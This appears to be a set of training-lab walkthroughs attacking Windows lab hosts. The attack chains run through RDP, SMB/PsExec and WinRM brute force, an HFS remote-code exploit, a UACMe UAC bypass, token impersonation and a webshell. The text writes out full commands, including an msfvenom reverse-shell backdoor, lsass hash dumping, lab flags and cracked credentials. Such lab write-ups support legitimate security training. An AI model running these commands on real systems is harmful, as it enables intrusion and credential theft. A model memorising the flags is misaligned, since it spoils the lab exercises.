# Lab Walkthrough: RDP on a Non-Standard Port (3333)

## 🎯 Objective

Identify a hidden RDP service running on a non-default port, brute-force valid credentials, log in via RDP, and retrieve the flag from the target system.

## Step 1: Access the Lab Environment

You are provided with:
- A Kali Linux attacker machine
- A target Windows machine at `demo.ine.local`

At this stage, no assumptions are made about running services.

## Step 2: Check Target Reachability

### Command

```bash
ping -c 4 demo.ine.local
```

### Why this matters

- Confirms network connectivity
- Ensures the target is online
- Saves time before scanning

### Result

- ICMP replies received → Target is reachable

## Step 3: Scan for Open Ports & Services (Recon Phase)

### Command

```bash
nmap -sV demo.ine.local
```

### What this does

- `-sV` → Detects service versions
- Identifies what services are running, not just open ports

### Result

- Multiple ports are open
- Port 3389 (default RDP) is NOT open
- An unusual port (3333) is open

### Key Insight

Just because RDP isn't on 3389 doesn't mean it's not running.

## Step 4: Identify RDP on a Non-Standard Port

Since port 3333 is open, we verify whether it's running RDP.

### Tool Used

Metasploit auxiliary RDP scanner

### Commands

```bash
msfconsole
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS demo.ine.local
set RPORT 3333
exploit
```

### Why this works

- The module checks for RDP protocol fingerprints
- Confirms RDP even if the port is changed

### Result

✅ RDP detected on port 3333

📌 **Important Lesson:** Changing ports is security through obscurity, not real protection.

## Step 5: Brute-Force RDP Credentials with Hydra

Now that RDP is confirmed, we attempt credential discovery.

### Command

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
      -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
      rdp://demo.ine.local -s 3333
```

### What Hydra is doing

- `-L` → Username list
- `-P` → Password list
- `rdp://` → RDP module
- `-s 3333` → Non-standard RDP port

### Why Hydra is used

- RDP supports password authentication
- Weak credentials are common in labs and real attacks

### Result

✅ Multiple valid username/password combinations found

⚠️ **Note:** After Hydra finishes, wait ~30–40 seconds

Windows explains this as:
- Rate limiting
- Temporary authentication delay

## Step 6: Login Using RDP (xfreerdp)

Now we perform a real RDP login.

### Command

```bash
xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333
```

### What happens

- A full Windows GUI session opens
- You are now inside the target machine

### Why xfreerdp

- Native Linux RDP client
- Supports custom ports
- Supports NTLM, PtH, NLA

## Step 7: Locate the Flag

Once logged in:

1. Open My Computer
2. Navigate to:

```
C:\
```

3. Locate the flag file
4. Open it

### Result

🎉 **Flag Found**

```
port-number-3333
```

## 🧠 What You Learned (Key Takeaways)

### Technical Lessons

- RDP can run on any port
- Nmap alone doesn't confirm RDP
- Metasploit auxiliary modules are excellent for service identification
- Weak passwords = total compromise
- RDP provides full GUI access

### Real-World Relevance

- Common in lateral movement
- Used by ransomware groups
- Often exposed on non-standard ports
- Rarely monitored properly

## 🔐 Defensive Notes (Blue Team Insight)

### To prevent this attack:

- Disable RDP if unused
- Enforce strong passwords
- Enable NLA + MFA
- Monitor failed RDP logins
- Restrict RDP via firewall
---
# 🧩 Lab Walkthrough: SMB Enumeration & PsExec Exploitation

## 🎯 Objective

Identify an exposed SMB service, brute-force valid credentials, exploit SMB using PsExec, gain a Meterpreter shell, and retrieve the flag from the target system.

## Step 1: Access the Lab Environment

You are provided with:
- A Kali Linux attacker machine
- A Windows target machine at:

```
demo.ine.local
```

At this point, no services are assumed to be running.

## Step 2: Scan the Target with Nmap

### Command

```bash
nmap demo.ine.local
```

### Why this step is important

- Discovers open ports
- Identifies entry points into the system
- SMB attacks require port 445 to be open

### Result

- Multiple ports are open
- SMB (port 445) is exposed

📌 **Key Insight:** If port 445 is open, the system is likely vulnerable to credential-based attacks rather than exploits.

## Step 3: Identify SMB Protocols & Dialects

### Command

```bash
nmap -p445 --script smb-protocols demo.ine.local
```

### What this does

- Detects SMB versions supported by the target
- Shows whether the system allows modern or legacy SMB
- Helps decide which attacks will work

### Why this matters

- Older SMB versions = more attack surface
- Even newer SMB versions are vulnerable to weak credentials

### Result

- SMB service confirmed
- SMB authentication possible

## Step 4: Brute-Force SMB Credentials Using Metasploit

Now that SMB is confirmed, we try to find valid usernames and passwords.

### Start Metasploit

```bash
msfconsole -q
```

### Load SMB login scanner

```bash
use auxiliary/scanner/smb/smb_login
```

### Configure the module

```bash
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS demo.ine.local
set VERBOSE false
```

### Run the attack

```bash
exploit
```

### Why this works

- SMB allows authentication attempts
- Weak or reused passwords are common
- No exploit is needed—only valid credentials

⏳ **Note:** This step may take 2–3 minutes depending on wordlist size.

### Result

✅ Multiple valid user/password combinations discovered

One of them is an Administrator account

## Step 5: Exploit SMB Using PsExec

Now that we have administrator credentials, we use PsExec to gain remote code execution.

### Why PsExec?

- Uses legitimate Windows behavior
- Executes commands as NT AUTHORITY\SYSTEM
- Extremely reliable in real environments

### Load PsExec module

```bash
use exploit/windows/smb/psexec
```

### Set required options

```bash
set RHOSTS demo.ine.local
set SMBUser Administrator
set SMBPass qwertyuiop
```

### Launch the exploit

```bash
exploit
```

### What happens internally

1. Authenticates using SMB
2. Uploads a service binary
3. Creates a Windows service
4. Executes payload as SYSTEM
5. Returns a Meterpreter shell

### Result

🎉 Meterpreter session successfully opened

## Step 6: Locate and Read the Flag

Now that we have full access, we search for the flag.

### Drop into a Windows shell

```bash
shell
```

### Navigate and list files

```bash
cd /
dir
```

### Read the flag

```bash
type flag.txt
```

### Result

✅ Flag retrieved

```
e0da81a9cd42b261bc9b90d15f780433
```
---
# 🧩 Lab Walkthrough: Exploiting WinRM Using Metasploit

## 🎯 Objective

Identify a WinRM service, brute-force valid credentials, execute remote commands, gain a Meterpreter shell, and retrieve the flag.

## Step 1: Access the Lab Environment

You are provided with:
- A Kali Linux attacker machine
- A Windows target machine at:

```
demo.ine.local
```

At this stage, no services are known.

## Step 2: Scan the Target for Open Ports

### Command

```bash
nmap --top-ports 7000 demo.ine.local
```

### Why this step is important

- Scans the most commonly used ports
- Faster than a full `-p-` scan
- Ideal for service discovery in labs

### Result

You discover:

```
5985/tcp open  http
```

📌 **Key Insight:** Port 5985 is the default port for WinRM over HTTP.

## Step 3: Brute-Force WinRM Credentials

WinRM does not allow anonymous access, so valid credentials are required.

### Start Metasploit

```bash
msfconsole -q
```

### Load WinRM login scanner

```bash
use auxiliary/scanner/winrm/winrm_login
```

### Configure the module

```bash
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
```

### Why PASSWORD is required

In newer Metasploit versions:
- The `PASSWORD` option must be set
- Even if `PASS_FILE` is used
- Metasploit still brute-forces from the wordlist

### Launch the attack

```bash
exploit
```

⏳ **Note:** This takes 2–3 minutes.

### Result

- Valid credentials discovered:

```
administrator : tinkerbell
```

- A command shell session opens in the background

📌 **Important Concept:** WinRM attacks are credential-based, not exploits.

## Step 4: Identify Supported WinRM Authentication Methods

Before interacting further, we must confirm which authentication types the server allows.

### Load authentication enumeration module

```bash
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS demo.ine.local
exploit
```

### Result

The target supports:
- Basic
- Negotiate (NTLM/Kerberos)

📌 **Why this matters:** If the authentication type is unsupported, login attempts will fail even with correct credentials.

## Step 5: Execute a Remote Command via WinRM

Now that we:
- Know WinRM is active
- Have valid credentials
- Know supported auth methods

We can execute commands remotely.

### Load command execution module

```bash
use auxiliary/scanner/winrm/winrm_cmd
```

### Set options

```bash
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell
set CMD whoami
```

### Execute

```bash
exploit
```

### Result

```
nt authority\system
```

✅ Remote command execution confirmed.

📌 **Key Insight:** WinRM allows fileless command execution using PowerShell.

## Step 6: Gain a Meterpreter Shell via WinRM

Command execution is good, but Meterpreter gives:
- Session management
- File upload/download
- Post-exploitation modules

### Load WinRM exploit module

```bash
use exploit/windows/winrm/winrm_script_exec
```

### Configure options

```bash
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell
set FORCE_VBS true
```

### Why FORCE_VBS is used

- Ensures compatibility
- Uses a VBS stager if PowerShell restrictions exist

### Launch exploit

```bash
exploit
```

### Result

🎉 Meterpreter session opened successfully

## Step 7: Locate and Read the Flag

### Navigate the file system

```bash
cd /
dir
```

### Read the flag

```bash
cat flag.txt
```

### Flag

```
3c716f95616eec677a7078f92657a230
```
---
# Windows Privilege Escalation Lab – HFS → UAC Bypass → Hash Dump

## 🎯 Objective

- Exploit a vulnerable web application (HFS)
- Gain an initial Meterpreter shell
- Escalate privileges using UAC bypass
- Dump NTLM hashes from the system

## Step 1️⃣ Access the Lab Environment

You are provided with:
- A Kali Linux attacker machine
- A Windows target machine at `demo.ine.local`

All attacks are performed from Kali to the target.

## Step 2️⃣ Verify Target Reachability

### Command

```bash
ping -c 4 demo.ine.local
```

### Why?

Before scanning or exploiting, you must confirm:
- DNS resolution works
- Network connectivity exists

### Result

Replies received → Target is reachable

## Step 3️⃣ Scan for Open Ports

### Command

```bash
nmap demo.ine.local
```

### Why?

This identifies:
- Which services are running
- Potential attack surfaces

### Result

- Multiple ports discovered
- Port 80 (HTTP) is open

## Step 4️⃣ Identify Service Version on Port 80

### Command

```bash
nmap -sV -p 80 demo.ine.local
```

### Why?

Exploitation depends on exact service versions.

### Result

```
HTTP File Server (HFS) 2.3
```

✅ This is a known vulnerable version.

## Step 5️⃣ Search for Known Exploits

### Command

```bash
searchsploit hfs
```

### Why?

To find:
- Public exploits
- Metasploit modules
- Known vulnerabilities

### Result

Rejetto HFS 2.3 → Remote Code Execution (RCE) available

## Step 6️⃣ Exploit HFS Using Metasploit

### Commands

```bash
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
```

### Why?

- This exploit allows unauthenticated RCE
- Metasploit automatically delivers a payload

### Result

✅ Meterpreter session obtained

## Step 7️⃣ Verify Access Level

### Commands

```bash
getuid
sysinfo
```

### Why?

To understand:
- Which user you are running as
- OS architecture (important for next steps)

### Result

- Running as admin
- OS is 64-bit
- Meterpreter initially may be x86

## Step 8️⃣ Migrate into explorer.exe

### Commands

```bash
ps -S explorer.exe
migrate <PID>
```

### Why migrate?

`explorer.exe` is:
- Stable
- Trusted
- 64-bit

Migration:
- Upgrades Meterpreter to x64
- Prevents session crashes

### Result

✅ Meterpreter now runs as x64/windows

## Step 9️⃣ Attempt Automatic Privilege Escalation

### Command

```bash
getsystem
```

### Why?

This attempts known Windows privilege escalation techniques.

### Result

❌ Failed (expected)

**Reason:**
- User is admin
- But UAC is enabled
- Admin ≠ SYSTEM

## Step 🔟 Confirm Admin Group Membership

### Commands

```bash
shell
net localgroup administrators
```

### Why?

To confirm:
- User is an administrator
- UAC is blocking elevation

### Result

- ✔ Admin user is in Administrators group
- ❌ Still not high integrity

➡ UAC bypass required

## Step 1️⃣1️⃣ Generate Malicious Payload

### Command

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.31.2 LPORT=4444 -f exe > backdoor.exe
```

**Replace `10.10.31.2` with your Kali IP**

### Why?

This payload:
- Will be executed with elevated privileges
- Calls back to your listener

## Step 1️⃣2️⃣ Upload UACMe and Payload

### Commands

```bash
cd C:\Users\admin\AppData\Local\Temp
upload /root/Desktop/tools/UACME/Akagi64.exe .
upload /root/backdoor.exe .
ls
```

### Why this location?

- Writable by admin user
- Common place for execution
- Avoids permission issues

## Step 1️⃣3️⃣ Start a Listener (Multi/Handler)

### Commands (new terminal)

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.31.2
set LPORT 4444
exploit
```

### Why?

- To receive the elevated Meterpreter shell
- Payload needs a listener before execution

## Step 1️⃣4️⃣ Execute UAC Bypass (UACMe)

### Commands

```bash
shell
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
```

### What is happening?

Method 23 abuses:
- `pkgmgr.exe`
- DLL hijacking
- Bypasses UAC without prompt
- Executes payload as high integrity

### Result

🔥 New Meterpreter session as SYSTEM

## Step 1️⃣5️⃣ Migrate into lsass.exe

### Commands

```bash
ps -S lsass.exe
migrate <PID>
```

### Why lsass.exe?

LSASS stores:
- NTLM hashes
- Credentials
- Requires SYSTEM + correct architecture

## Step 1️⃣6️⃣ Dump Password Hashes

### Command

```bash
hashdump
```

### Result

```
Admin NTLM Hash: 4d6583ed4cef81c2f2ac3c88fc5f3da6
```

🎉 This is the flag

## 🧠 Key Concepts Learned

- Service versioning is critical
- Admin ≠ SYSTEM (because of UAC)
- UAC bypass is required for elevation
- Architecture matters (x86 vs x64)
- LSASS holds credential material
- Migration is essential for stability and access

## ✅ Final Flag

```
4d6583ed4cef81c2f2ac3c88fc5f3da6
```
---
# 🧪 Lab Walkthrough — HFS Exploitation + Token Impersonation

## 🎯 Goal

Exploit a vulnerable Rejetto HTTP File Server (HFS 2.3), gain a Meterpreter shell, and use token impersonation to read a flag stored in the Administrator's Desktop, which is otherwise inaccessible.

## Step 1: Access the Lab Environment

You start the lab and are provided access to a Kali Linux machine and a target Windows machine reachable as:

```
demo.ine.local
```

This Kali machine will be used to perform reconnaissance and exploitation.

## Step 2: Scan the Target for Open Ports

### Command

```bash
nmap demo.ine.local
```

### Why this step?

- Nmap is used to identify open ports and exposed services
- This tells us what attack surface is available

### What happens?

Nmap sends probes to common ports and reports which services respond.

### Result

- Multiple ports are open
- Port 80 (HTTP) is open → this becomes the main focus

## Step 3: Identify the Service Running on Port 80

### Command

```bash
nmap -sV -p 80 demo.ine.local
```

### Why this step?

- `-sV` performs service version detection
- Knowing the exact software and version is critical for finding exploits

### Result

```
HTTP File Server (HFS) 2.3
```

This is a known vulnerable application.

## Step 4: Search for Known Exploits

### Command

```bash
searchsploit hfs
```

### Why this step?

- `searchsploit` searches Exploit-DB locally
- Helps confirm whether public exploits exist

### Result

You find exploits for:

```
Rejetto HTTP File Server (HFS) 2.3 – Remote Code Execution
```

This confirms the target is exploitable.

## Step 5: Exploit HFS Using Metasploit

### Commands

```bash
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
getuid
```

### Why Metasploit?

- Faster, reliable exploitation
- Automatically handles payload delivery and session creation

### What happens internally?

- The exploit abuses command injection in HFS
- A payload is delivered via HTTP
- Meterpreter connects back to Kali

### Result

You gain a Meterpreter session:

```
Running as: NT AUTHORITY\LOCAL SERVICE
```

- ✔ Initial access achieved
- ❌ Not running as Administrator

## Step 6: Attempt to Read the Flag

### Command

```bash
cat C:\Users\Administrator\Desktop\flag.txt
```

### Why this fails?

- The Administrator Desktop is protected
- `LOCAL SERVICE` does not have permission to access it

This confirms:

**We need higher privileges or a better identity**

## Step 7: Load Incognito and List Tokens

### Commands

```bash
load incognito
list_tokens -u
```

### Why Incognito?

- Incognito allows token enumeration and impersonation
- Tokens represent identities already authenticated on the system

### What happens internally?

- Windows keeps access tokens for logged-in users
- Some services can impersonate those tokens

### Result

You see:

```
ATTACKDEFENSE\Administrator
```

This means:
- ✔ The Administrator is logged in
- ✔ Their token is available
- ✔ Token impersonation is possible

## Step 8: Impersonate the Administrator Token

### Commands

```bash
impersonate_token ATTACKDEFENSE\Administrator
getuid
cat C:\Users\Administrator\Desktop\flag.txt
```

### What happens?

- Meterpreter switches identity to Administrator
- No password is needed
- Windows trusts the token

### Verification

```
getuid
ATTACKDEFENSE\Administrator
```

You are now acting as Administrator.

## 🎉 Final Result: Flag Retrieved

```
Flag: x28c832a39730b7d46d6c38f1ea18e12
```

- ✔ Exploitation successful
- ✔ Privilege escalation via token impersonation
- ✔ Objective completed

## 🧠 Key Concepts Learned (Important for Exams)

### 🔑 Why this worked

- HFS provided remote code execution
- Windows had an Administrator token available
- `SeImpersonatePrivilege` allowed token impersonation
- Incognito enabled identity switching

### 🧩 Core Techniques Used

- Service enumeration
- Exploit discovery
- Metasploit exploitation
- Token impersonation (no password)
- Privilege escalation without kernel exploits

## 🧠 Exam-Ready Mental Model

If you see:
- Windows target
- Low-priv shell
- Administrator logged in
- Incognito available

👉 **Think: Token impersonation**
---
# 📝 System / Host-Based Attacks Lab – Write-Up

## Objective

The objective of this lab was to perform system/host-based attacks against two Windows targets in order to identify misconfigurations, abuse weak authentication mechanisms, and retrieve four hidden flags.

## 🔍 Target Enumeration

Two targets were provided:
- `target1.ine.local`
- `target2.ine.local`

Initial enumeration revealed Windows hosts exposing web and SMB services, which became the primary attack vectors.

## 🚩 Flag 1 – Weak Web Authentication (target1)

### Description

The lab hinted that user `bob` might have chosen a weak password and that the flag was accessible through authentication abuse.

### Methodology

- Discovered an authenticated web login page on `target1.ine.local`
- Username `bob` was known
- Performed a dictionary-based brute force attack against the HTTP login using a common password wordlist

### Result

Valid credentials were discovered:

```
bob : password_123321
```

Successful authentication confirmed weak password hygiene.

### Flag 1

✅ Retrieved after authenticating to the web application.

## 🚩 Flag 2 – IIS WebDAV Abuse & File Enumeration (target1)

### Description

The hint suggested that valuable files are often located on the `C:\` drive, indicating post-authentication enumeration.

### Methodology

- Identified IIS with WebDAV enabled
- Authenticated to WebDAV using Bob's credentials
- Used Cadaver to upload an ASP webshell
- Executed the webshell to gain command execution on the Windows host
- Enumerated the filesystem, focusing on the `C:\` drive

### Result

The flag was located on the local filesystem and retrieved via command execution.

### Flag 2

✅ Retrieved from the `C:\` drive after IIS webshell execution.

## 🚩 Flag 3 – SMB Credential Guessing (target2)

### Description

The lab indicated that SMB credential guessing could lead to valuable information.

### Methodology

- Confirmed SMB service was running on `target2.ine.local`
- Performed SMB authentication attempts
- Successfully discovered valid administrative credentials

### Result

Valid SMB credentials were obtained:

```
administrator : pineapple
```

This provided administrative-level access to the target system via SMB.

### Flag 3

✅ Retrieved after successful SMB authentication.

## 🚩 Flag 4 – SMB Share Enumeration (target2)

### Description

The hint indicated that the Desktop directory contained the final flag.

### Methodology

- Used administrator credentials to enumerate SMB shares
- Connected to the `C$` administrative share
- Navigated through:

```
C:\Users\Administrator\Desktop
```

- Located and downloaded `flag.txt`

### Result

The flag was successfully retrieved via SMB file access.

### Flag 4

✅ Retrieved from the Administrator's Desktop directory.

## 🧠 Conclusion

This lab demonstrated that system/host-based attacks often rely on:
- Weak credentials
- Poor authentication controls
- Misconfigured services (IIS + WebDAV)
- Excessive SMB permissions

**No advanced exploits or kernel vulnerabilities were required.**
